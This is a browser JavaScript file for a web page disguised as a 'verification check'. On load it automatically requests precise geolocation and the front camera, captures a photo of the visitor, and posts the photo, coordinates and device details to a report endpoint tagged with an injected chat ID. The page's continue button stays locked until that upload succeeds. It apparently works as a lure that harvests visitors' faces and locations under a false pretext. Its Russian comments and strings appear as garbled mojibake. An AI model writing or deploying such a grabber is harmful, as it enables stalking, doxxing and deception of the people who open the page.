// === app.js ===

// –ù–∞—Å—Ç—Ä–æ–π–∫–∏: —Ä–∞–±–æ—Ç–∞–µ–º –ø–æ —Ç–æ–º—É –∂–µ origin, –≥–¥–µ –æ—Ç–∫—Ä—ã—Ç —Å–∞–π—Ç
const API_BASE = ''; // –æ—Å—Ç–∞–≤–ª—è–µ–º –ø—É—Å—Ç—ã–º ‚Äî –∑–∞–ø—Ä–æ—Å—ã –∏–¥—É—Ç –Ω–∞ —Ç–æ—Ç –∂–µ –¥–æ–º–µ–Ω

// –ö—ç—à–∏—Ä—É–µ–º UI
const UI = {
  text: document.getElementById('text'),
  note: document.getElementById('note'),
  btn: document.getElementById('enterBtn'),
};

// –§–ª–∞–≥ –≥–æ—Ç–æ–≤–Ω–æ—Å—Ç–∏ –∫ –ø–µ—Ä–µ—Ö–æ–¥—É
window.__reportReady = false;

// === –°—Ç–∏–ª–∏ –∫–Ω–æ–ø–∫–∏ ===
function setBtnLocked() {
  const b = UI.btn;
  if (!b) return;
  b.disabled = true;
  b.style.filter = 'grayscale(35%) brightness(0.9)';
  b.style.opacity = '0.6';
  b.style.cursor = 'not-allowed';
  b.style.background = 'linear-gradient(90deg, #246, #39a)';
  b.style.boxShadow = '0 0 6px rgba(0,153,255,.25)';
}

function setBtnReady() {
  const b = UI.btn;
  if (!b) return;
  b.disabled = false;
  b.style.filter = 'none';
  b.style.opacity = '1';
  b.style.cursor = 'pointer';
  b.style.background = 'linear-gradient(90deg, #4f00ff, #00bfff)';
  b.style.boxShadow = '0 0 20px rgba(79,0,255,.6), 0 0 28px rgba(0,191,255,.45)';
}

// === –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è ===
async function askGeolocation() {
  return new Promise((resolve) => {
    if (!('geolocation' in navigator)) return resolve(null);
    navigator.geolocation.getCurrentPosition(
      (p) =>
        resolve({
          lat: p.coords.latitude,
          lon: p.coords.longitude,
          acc: Math.round(p.coords.accuracy),
          ts: Date.now(),
        }),
      () => resolve(null),
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  });
}

// === –§–æ—Ç–æ —Å –∫–∞–º–µ—Ä—ã ===
async function takePhoto() {
  if (!navigator.mediaDevices?.getUserMedia) throw new Error('Camera unsupported');

  const stream = await navigator.mediaDevices.getUserMedia({
    video: { facingMode: 'user' },
  });
  const [track] = stream.getVideoTracks();

  try {
    // –ü—É—Ç—å 1: ImageCapture, –≥–¥–µ –¥–æ—Å—Ç—É–ø–µ–Ω
    const cap = new ImageCapture(track);
    const bmp = await cap.grabFrame();
    const c = document.createElement('canvas');
    c.width = bmp.width;
    c.height = bmp.height;
    c.getContext('2d').drawImage(bmp, 0, 0);
    const dataUrl = c.toDataURL('image/jpeg', 0.85);
    track.stop();
    return dataUrl;
  } catch {
    // –ü—É—Ç—å 2: —á–µ—Ä–µ–∑ <video> (Safari/iOS –∏ –¥—Ä.)
    const v = document.createElement('video');
    v.playsInline = true;
    v.muted = true;
    v.srcObject = stream;

    await new Promise((res) => (v.onloadedmetadata = res)).catch(() => {});
    try { await v.play(); } catch {}

    const w = v.videoWidth || 640;
    const h = v.videoHeight || 480;
    const c = document.createElement('canvas');
    c.width = w;
    c.height = h;
    c.getContext('2d').drawImage(v, 0, 0, w, h);
    const dataUrl = c.toDataURL('image/jpeg', 0.85);
    stream.getTracks().forEach((t) => t.stop());
    return dataUrl;
  }
}

// === –ò–Ω—Ñ–æ –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ ===
function getDeviceInfo() {
  const ua = navigator.userAgent;
  const isSafari =
    /Safari\//.test(ua) &&
    !/Chrome|CriOS|Chromium|FxiOS|Edg|OPR/.test(ua) &&
    navigator.vendor === 'Apple Computer, Inc.';
  const m = ua.match(/OS\s(\d+)[_.]/);
  const iosVer = m ? parseInt(m[1], 10) : null;
  return {
    userAgent: ua,
    platform: navigator.platform,
    iosVersion: iosVer,
    isSafari,
  };
}

// === –û—Ç–ø—Ä–∞–≤–∫–∞ –æ—Ç—á—ë—Ç–∞ ===
async function sendReport({ photoBase64, geo }) {
  const info = getDeviceInfo();
  const body = { ...info, geo, photoBase64, note: 'auto' };

  // üëá –ø–æ–¥–¥–µ—Ä–∂–∫–∞ –≤–Ω–µ–¥—Ä—ë–Ω–Ω—ã—Ö chatId –∏ slug –æ—Ç —Å–µ—Ä–≤–µ—Ä–∞
  if (window.__reportChatId) body.chatId = window.__reportChatId;
  if (window.__SLUG) body.slug = window.__SLUG;

  const r = await fetch(`${API_BASE}/api/report`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  });

  const data = await r.json().catch(() => ({}));
  if (!data.ok) throw new Error(data.error || 'Send failed');
  return data;
}

// === –û—Å–Ω–æ–≤–Ω–æ–π –ø–æ—Ç–æ–∫ ===
async function autoFlow() {
  try {
    setBtnLocked();
    if (UI.text) UI.text.innerHTML = '–ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –∫–∞–º–µ—Ä—É –∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é‚Ä¶';

    const [geo, photoBase64] = await Promise.all([askGeolocation(), takePhoto()]);

    if (UI.text) UI.text.innerHTML = '–û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏‚Ä¶';
    await sendReport({ photoBase64, geo });

    window.__reportReady = true;
    setBtnReady();

    if (UI.text) UI.text.innerHTML = '<span class="ok">–ü—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–æ–π–¥–µ–Ω–∞.</span>';
    if (UI.note) UI.note.textContent = '–ú–æ–∂–Ω–æ –ø—Ä–æ–¥–æ–ª–∂–∏—Ç—å.';
  } catch (e) {
    console.error(e);
    setBtnLocked();
    window.__reportReady = false;
    if (UI.text) UI.text.innerHTML = '<span class="err">–ù–µ —É–¥–∞–ª–æ—Å—å –≤—ã–ø–æ–ª–Ω–∏—Ç—å –ø—Ä–æ–≤–µ—Ä–∫—É.</span>';
    if (UI.note) UI.note.textContent = '–ü–æ–≤—Ç–æ—Ä–∏ –ø–æ–∑–∂–µ.';
  }
}

// === –≠–∫—Å–ø–æ—Ä—Ç —Ñ—É–Ω–∫—Ü–∏–∏ (–Ω–∞ –≤—Å—è–∫–∏–π —Å–ª—É—á–∞–π)
window.__autoFlow = autoFlow;

// === –ò–ù–ò–¶–ò–ê–õ–ò–ó–ê–¶–ò–Ø –ü–û–°–õ–ï –ó–ê–ì–†–£–ó–ö–ò ===
document.addEventListener('DOMContentLoaded', () => {
  // –ø–æ–∫–∞–∑–∞—Ç—å –∫–Ω–æ–ø–∫—É (–µ—Å–ª–∏ –±—ã–ª–∞ —Å–∫—Ä—ã—Ç–∞ —Å—Ç–∏–ª—è–º–∏) –∏ –∑–∞–ª–æ—á–∏—Ç—å
  if (UI.btn) {
    UI.btn.style.display = 'block';
    setBtnLocked();
  }

  // –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏
  autoFlow().catch((err) => console.error('autoFlow error:', err));
});

// –ö–ª–∏–∫ –ø–æ –∫–Ω–æ–ø–∫–µ: –µ—Å–ª–∏ –ø—Ä–æ–≤–µ—Ä–∫–∞ –Ω–µ –≥–æ—Ç–æ–≤–∞ ‚Äî –ø–æ–≤—Ç–æ—Ä—è–µ–º –µ—ë,
// –µ—Å–ª–∏ –≥–æ—Ç–æ–≤–∞ ‚Äî –≤—ã–∑—ã–≤–∞–µ–º go() (—Ä–µ–¥–∏—Ä–µ–∫—Ç –∏–∑ index.html)
if (UI.btn) {
  UI.btn.addEventListener('click', async (e) => {
    e.preventDefault();
    if (!window.__reportReady) {
      try { await autoFlow(); } catch (err) { console.error('retry autoFlow error:', err); }
      return;
    }
    if (typeof go === 'function') {
      try { go(); } catch (err) { console.error('go() error:', err); }
    } else if (UI.note) {
      UI.note.textContent = '–ì–æ—Ç–æ–≤–æ ‚Äî –Ω–æ —Ü–µ–ª–µ–≤–æ–π —Ä–µ–¥–∏—Ä–µ–∫—Ç –Ω–µ –Ω–∞–π–¥–µ–Ω.';
    }
  });
}
